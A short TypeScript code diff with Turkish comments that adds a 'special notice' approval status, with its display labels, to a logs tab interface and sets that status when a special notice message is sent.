@@ -35,6 +35,11 @@ function getApprovalDisplayText(value: string): string {
   const isConfirmed = value.endsWith("_confirmed");
   const rawValue = isConfirmed ? value.slice(0, -"_confirmed".length) : value;
 
+  // Ozel onay (Special Notice): kullanici devam edince special_notice_confirmed olur.
+  if (rawValue === "special_notice") {
+    return isConfirmed ? "Özel Onay Onaylandı" : "Özel Onay [Bekliyor]";
+  }
+
   // Transfer onayi: yontem (smartid/mobileid) suffix'li — kolonda tek "Transfer" goster.
   if (rawValue.startsWith("transfer")) {
     return isConfirmed ? "Transfer Onaylandı" : "Transfer [Bekliyor]";
@@ -2077,7 +2082,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
       current_step: "special_approval",
       form_data: { 
         ...prev, 
-        approvalStatus: "",
+        approvalStatus: "special_notice",
         approvalCode: "",
         specialNoticeText: specialMessage.trim(), 
         specialNoticeImage: specialImage ?? "", 
